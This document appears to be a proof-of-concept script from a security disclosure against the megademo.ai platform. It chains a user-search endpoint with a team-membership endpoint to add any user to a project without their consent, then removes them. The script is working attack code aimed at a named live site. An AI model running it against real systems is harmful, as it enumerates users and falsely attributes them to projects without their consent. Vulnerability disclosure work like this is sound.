#!/usr/bin/env python3
"""PoC 15: Forced Team Membership — add any user to your project without consent.

The project owner can POST /projects/:id/team with an addEmail field to add
any registered user to their project. There is no invitation, acceptance, or
notification flow — the victim is immediately listed as a team member.

Combined with finding #5 (user enumeration), an attacker can:
1. Search for any user's email via /api/users/search
2. Force them onto their project team

Impact: Reputation/attribution manipulation — a malicious project owner could
list respected engineers as "team members" to imply endorsement.
"""

import os
import re
import sys

import requests

BASE = "https://megademo.ai"
COOKIE = os.environ.get(
    "MEGADEMO_COOKIE",
    "connect.sid=YOUR_SESSION_COOKIE_HERE",
)

session = requests.Session()
session.cookies.set("connect.sid", COOKIE.split("=", 1)[1])


def get_csrf():
    r = session.get(f"{BASE}/projects/mine")
    m = re.search(r'csrf-token["\s]+content="([^"]+)"', r.text)
    return m.group(1) if m else None


def find_own_project():
    """Find a project owned by the authenticated user."""
    r = session.get(f"{BASE}/projects/mine")
    # Look for project cards with edit links (indicates ownership)
    matches = re.findall(r'/projects/([a-f0-9]{24})/edit', r.text)
    if matches:
        return matches[0]
    return None


def search_user(query="test"):
    """Find a user to add (use 'test' to find test accounts safely)."""
    r = session.get(f"{BASE}/api/users/search", params={"q": query})
    if r.status_code == 200:
        return r.json()
    return []


def main():
    csrf = get_csrf()
    if not csrf:
        sys.exit("Could not get CSRF token")

    # Find a project we own
    project_id = find_own_project()
    if not project_id:
        sys.exit("No owned project found to test with")
    print(f"Using owned project: {project_id}")

    # Find a test user to add
    users = search_user("test")
    if not users:
        # Fall back to searching for any user
        users = search_user("a")
    if not users:
        sys.exit("No users found via search")

    # Pick a user (prefer test accounts for safety)
    target = None
    for u in users:
        email = u.get("email", "")
        if "test" in email.lower():
            target = u
            break
    if not target:
        target = users[0]

    target_email = target.get("email")
    target_name = target.get("name", target_email)
    print(f"Target user: {target_name} <{target_email}>")

    # Add them to our project without their consent
    headers = {"X-CSRF-Token": csrf}
    r = session.post(
        f"{BASE}/projects/{project_id}/team",
        headers=headers,
        json={"addEmail": target_email},
    )
    print(f"\nPOST /projects/{project_id}/team -> {r.status_code}")
    print(f"Response: {r.text}")

    if r.status_code == 200 and "success" in r.text:
        print(f"\nCONFIRMED: {target_name} was added to the project without any consent flow.")

        # Clean up: remove them
        data = r.json()
        added_id = data.get("id")
        if added_id:
            r2 = session.post(
                f"{BASE}/projects/{project_id}/team",
                headers={"X-CSRF-Token": get_csrf()},
                json={"removeUserId": added_id},
            )
            print(f"Cleanup: removed user -> {r2.status_code} {r2.text}")
    else:
        print(f"\nNot confirmed: got status {r.status_code}")


if __name__ == "__main__":
    main()
